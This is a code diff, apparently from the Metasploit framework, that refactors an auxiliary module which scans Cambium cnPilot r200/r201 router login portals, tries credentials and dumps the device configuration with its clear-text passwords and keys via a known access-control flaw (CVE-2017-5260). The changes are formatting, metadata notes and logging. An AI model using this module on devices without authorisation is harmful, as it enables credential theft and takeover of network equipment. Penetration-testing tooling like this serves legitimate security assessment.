@@ -7,30 +7,35 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::CNPILOT
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'Cambium cnPilot r200/r201 Login Scanner and Config Dump',
-      'Description' => %{
-        This module scans for Cambium cnPilot r200/r201 management login
-        portal(s), attempts to identify valid credentials, and dump device
-        configuration.
+    super(
+      update_info(
+        info,
+        'Name' => 'Cambium cnPilot r200/r201 Login Scanner and Config Dump',
+        'Description' => %q{
+          This module scans for Cambium cnPilot r200/r201 management login
+          portal(s), attempts to identify valid credentials, and dump device
+          configuration.
 
-        The device has at least two (2) users - admin and user. Due to an
-        access control vulnerability, it is possible for 'user' account to access full
-        device config. All information, including passwords, and keys, is stored
-        insecurely, in clear-text form, thus allowing unauthorized admin access to any
-        user.
-      },
-      'Author' =>
-        [
+          The device has at least two (2) users - admin and user. Due to an
+          access control vulnerability, it is possible for 'user' account to access full
+          device config. All information, including passwords, and keys, is stored
+          insecurely, in clear-text form, thus allowing unauthorized admin access to any
+          user.
+        },
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'References' =>
-        [
+        'References' => [
           ['CVE', '2017-5260'],
           ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']
         ],
-      'License' => MSF_LICENSE
-     )
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
     )
 
     register_options(
@@ -81,15 +86,15 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     if res && res.code == 200 && res.headers['content-disposition']
-      print_status("#{rhost}:#{rport} - dumping device configuration")
-      print_good("#{rhost}:#{rport} - Configfile.cfg retrieved successfully!")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - dumping device configuration")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Configfile.cfg retrieved successfully!")
       loot_name = 'Configfile.cfg'
       loot_type = 'text/plain'
       loot_desc = 'Cambium cnPilot Config'
       path = store_loot(loot_name, loot_type, datastore['RHOST'], res.body, loot_desc)
-      print_good("#{rhost}:#{rport} - File saved in: #{path}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - File saved in: #{path}")
     else
-      print_error("#{rhost}:#{rport} - Failed to retrieve config. Set a higher HTTPCLIENTTIMEOUT and try again.")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to retrieve config. Set a higher HTTPCLIENTTIMEOUT and try again.")
       return
     end
   end
